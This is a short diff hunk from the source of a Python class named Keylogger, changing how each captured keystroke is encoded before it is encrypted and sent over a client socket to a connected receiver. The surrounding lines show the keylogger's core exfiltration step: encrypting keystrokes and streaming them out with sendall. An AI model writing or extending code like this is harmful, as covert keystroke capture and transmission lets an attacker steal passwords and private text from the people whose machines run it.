@@ -55,7 +55,7 @@ class Keylogger():
 		if keystroke:
 
 			# byte_msg = keystroke.encode('utf-8')
-			byte_msg = crypt.encrypt(keystroke.encode('utf-8'))
+			byte_msg = crypt.encrypt(keystroke.encode())
 			if self.client_connect:
 
 				self.client.sendall(byte_msg)
